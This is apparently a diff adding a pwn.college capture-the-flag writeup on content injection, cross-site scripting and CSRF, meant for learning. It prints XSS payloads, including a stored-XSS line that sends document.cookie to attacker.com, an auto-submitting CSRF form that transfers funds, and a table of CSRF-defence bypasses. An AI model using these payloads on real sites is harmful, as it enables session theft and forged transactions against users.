@@ -1,0 +1,144 @@
+---
+title: "Web Security — Content Injection, XSS & CSRF"
+description: "Writeup for the Web Security module of pwn.college's Intro to Cybersecurity path, covering content injection, cross-site scripting, and cross-site request forgery."
+date: "2026-11-01"
+module: "Intro to Cybersecurity"
+difficulty: "Intro"
+points: "0"
+status: "completed"
+published: true
+---
+
+# Web Security
+
+> Module 1 of [Intro to Cybersecurity](https://pwn.college/intro-to-cybersecurity/) on pwn.college — covering content injection, XSS, and CSRF. 🟠 Orange Flag earned.
+
+---
+
+## Overview
+
+This module walks through the fundamentals of client-side web vulnerabilities:
+
+| Topic | What it tests |
+|---|---|
+| **Content Injection** | Injecting unsanitised user input into HTML responses |
+| **Cross-Site Scripting (XSS)** | Executing attacker-controlled JavaScript in a victim's browser |
+| **Cross-Site Request Forgery (CSRF)** | Forging authenticated requests from a victim's session |
+
+---
+
+## Content Injection
+
+Content injection happens when user-supplied data is reflected directly into a page without encoding. The browser interprets the injected content as markup, breaking out of the intended context.
+
+### Key Concepts
+
+- **HTML injection** — inject `<b>`, `<img>`, `<a>` tags to alter page appearance or trigger resource loads.
+- **Context matters** — payload shape depends on *where* the reflection lands: inside a tag value, between tags, inside a `<script>` block, or inside a CSS rule.
+
+### Approach
+
+```python
+# Probe with a harmless marker first
+payload = "<b>injected</b>"
+
+# Observe how it lands in the response
+# If rendered as bold text → HTML injection confirmed
+# If escaped to &lt;b&gt; → need a different bypass
+```
+
+---
+
+## Cross-Site Scripting (XSS)
+
+XSS allows an attacker to inject and execute JavaScript in the context of a target website inside another user's browser.
+
+### Reflected XSS
+
+The payload travels in the request (URL param, form field) and is immediately echoed back in the response.
+
+```html
+<!-- Classic reflected probe -->
+<script>alert(document.domain)</script>
+
+<!-- If angle brackets are filtered, try event handlers -->
+"><img src=x onerror=alert(1)>
+
+<!-- Inside a JS string context -->
+';alert(1)//
+```
+
+**Challenge approach:**
+
+1. Find a parameter reflected in the page source.
+2. Determine the injection context (HTML body / attribute / script block).
+3. Craft a payload that breaks out of the current context.
+4. Escalate — exfiltrate cookies with `document.cookie` or probe session tokens.
+
+### Stored XSS
+
+The payload is persisted server-side (DB, log, comment field) and served to every subsequent visitor.
+
+```html
+<!-- Input that gets stored and later reflected to admins -->
+<script>
+  fetch('https://attacker.com/steal?c=' + document.cookie);
+</script>
+```
+
+### DOM XSS
+
+The vulnerability lives entirely in client-side JavaScript; the server never sees the payload.
+
+```javascript
+// Vulnerable sink example
+document.getElementById('output').innerHTML = location.hash.slice(1);
+
+// Payload in the URL fragment — never sent to server
+https://victim.com/page#<img src=x onerror=alert(1)>
+```
+
+---
+
+## Cross-Site Request Forgery (CSRF)
+
+CSRF abuses the fact that browsers automatically attach cookies to any request matching the cookie's domain/path, regardless of *which* site initiated the request.
+
+### Anatomy of a CSRF Attack
+
+1. Victim is authenticated to `bank.com`.
+2. Victim visits attacker-controlled `evil.com`.
+3. `evil.com` issues a forged request to `bank.com/transfer` using the victim's session cookie.
+4. The server sees a valid authenticated request and executes it.
+
+### Exploit Skeleton
+
+```html
+<!-- Hosted on evil.com — GET-based action -->
+<img src="https://target.com/action?param=attacker_value">
+
+<!-- POST-based action (auto-submit form) -->
+<form id="csrf" action="https://target.com/sensitive-action" method="POST" hidden>
+  <input name="amount" value="1000">
+  <input name="to"     value="attacker_account">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+### CSRF Defences (and bypasses tested in the module)
+
+| Defence | Bypass |
+|---|---|
+| **CSRF token** (correctly implemented) | No bypass — must leak the token first (via XSS, CORS, referrer) |
+| **SameSite=Lax** cookie | Still vulnerable to top-level navigation (`GET`) requests |
+| **Origin / Referer check** | Spoof with null origin, or chain via open redirect |
+| **Custom request header** (e.g. `X-Requested-With`) | Only effective if CORS blocks the preflight |
+
+---
+
+## Lessons Learned
+
+- **Always check the injection context first.** The shape of a working payload is entirely determined by where the data lands in the DOM — rushing to `<script>alert(1)` without reading the source wastes time.
+- **XSS is the master key for CSRF.** A stored or reflected XSS that reaches an admin unlocks CSRF token exfiltration, making otherwise CSRF-protected endpoints exploitable.
+- **SameSite cookies are not a complete CSRF defence.** Lax mode still permits top-level GET navigations; only `Strict` or a proper CSRF token scheme closes the gap for sensitive state-changing operations.
+- **Content injection without script execution still has impact.** Defaced pages, injected phishing forms, and exfil via `<img src>` are all achievable with pure HTML injection when `<script>` is blocked.
